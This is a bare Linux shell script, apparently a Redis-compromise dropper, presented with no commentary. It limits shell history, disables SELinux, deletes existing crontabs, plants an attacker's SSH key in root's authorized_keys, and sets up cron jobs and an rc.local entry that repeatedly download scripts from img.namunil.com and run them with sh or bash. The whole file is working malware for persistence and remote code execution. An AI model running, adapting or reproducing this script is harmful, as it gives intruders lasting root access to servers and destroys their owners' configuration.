

PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/sbin:/usr/local/bin
HISTSIZE=1
uname -a
id
hostname
setenforce 0 2>/dev/null
ulimit -n 50000
ulimit -u 50000
crontab -r 2>/dev/null
rm -rf /var/spool/cron/* 2>/dev/null
mkdir -p /var/spool/cron/crontabs 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' > /root/.ssh/authorized_keys
echo '*/15 * * * * wget -q -O- http://img.namunil.com/ash.php | sh' > /var/spool/cron/root
echo '*/20 * * * * wget -q -O- http://img.namunil.com/ash.php | sh' > /var/spool/cron/crontabs/root
echo 'wget -q -O- http://img.namunil.com/ash.php | sh' > /etc/rc.local
echo 'exit 0' >> /etc/rc.local

yum install -y bash curl 2>/dev/null
apt install -y bash curl 2>/dev/null
apt-get install -y bash curl 2>/dev/null

bash -c 'wget -q -O- http://img.namunil.com/bsh.php | bash' 2>/dev/null

